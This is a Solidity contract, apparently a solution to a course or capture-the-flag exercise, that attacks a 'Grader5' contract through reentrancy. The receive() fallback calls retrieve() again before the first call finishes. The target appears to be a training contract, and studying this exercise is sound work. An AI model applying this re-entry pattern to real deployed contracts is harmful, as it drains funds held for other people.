// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IGrader5 {
    function retrieve() external payable;

    function gradeMe(string calldata name) external;
}

contract EthKipuHacker {
    IGrader5 private immutable i_grader;
    address private immutable i_owner;
    bool private reentrancyLock;

    constructor(address graderAddress) {
        i_grader = IGrader5(graderAddress);
        i_owner = msg.sender;
    }

    function deposit() external payable {}

    function hack() external {
        require(msg.sender == i_owner, "You're not the owner");
        require(
            address(this).balance > 3,
            "Contract mustbe funded with at least 4 wei"
        );

        reentrancyLock = false;
        i_grader.retrieve{value: 4}();
    }

    function doGradeMe(string calldata name) external {
        require(msg.sender == i_owner, "You're not the owner");
        i_grader.gradeMe(name);
    }

    receive() external payable {
        if (!reentrancyLock) {
            reentrancyLock = true;
            i_grader.retrieve{value: 4}();
        }
    }
}
